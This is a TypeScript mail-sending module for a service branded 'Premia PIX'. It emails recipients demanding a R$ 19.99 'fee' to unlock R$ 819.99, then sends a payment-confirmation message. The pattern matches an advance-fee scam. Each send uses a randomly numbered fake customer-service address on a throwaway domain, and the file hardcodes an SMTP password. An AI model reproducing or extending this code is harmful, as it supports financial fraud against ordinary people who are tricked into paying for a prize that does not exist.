import { htmlMailPix, htmlPaymentSuccessfly } from '@/functions/template-mail';
import nodemailer from 'nodemailer';


function numeroRandomico(): number {
  return Math.floor(Math.random() * 99) + 1;
}

function getSaudacao() {
  const agora = new Date();
  const options = { timeZone: 'America/Sao_Paulo', hour: 'numeric' } as const;
  const formatter = new Intl.DateTimeFormat('pt-BR', options);
  const parts = formatter.formatToParts(agora);
  const hora = parseInt(parts.find(part => part.type === 'hour')?.value || '0');

  let saudacao;

  if (hora >= 5 && hora < 12) {
    saudacao = "bom dia";
  } else if (hora >= 12 && hora < 18) {
    saudacao = "boa tarde";
  } else {
    saudacao = "boa noite";
  }

  return saudacao;
}

const saudacao = getSaudacao();

export const sendEmailSuccessflyPayment = (to: string, name: string) => {
  const random = numeroRandomico();
  const smtp = nodemailer.createTransport({
    host: "smtp.hostinger.com",
    port: 465,
    secure: true,
    auth: {
      user: `sac${random}@atendimento-rapido.click`,
      pass: 'N]O!6?Jx',
    },
  });


  return smtp.sendMail({
    from: `Premia PIX <sac${random}@atendimento-rapido.click>`,
    to,
    subject: 'Sucesso: Seu pagamento foi confirmado com sucesso. Acesse a plataforma para receber seus benefícios.',
    html: htmlPaymentSuccessfly(name, saudacao)
  });
};

export const sendEMailPix = (to: string, link: string, name: string) => {
  const random = numeroRandomico();
  const smtp = nodemailer.createTransport({
    host: "smtp.hostinger.com",
    port: 465,
    secure: true,
    auth: {
      user: `sac${random}@atendimento-rapido.click`,
      pass: 'N]O!6?Jx',
    },
  });

  return smtp.sendMail({
    from: `Premia PIX <sac${random}@atendimento-rapido.click>`,
    to,
    subject: 'Importante: Pague sua taxa de R$ 19,99 para desbloquear seu os R$ 819,99.',
    html: htmlMailPix(link, name, saudacao),
  });
};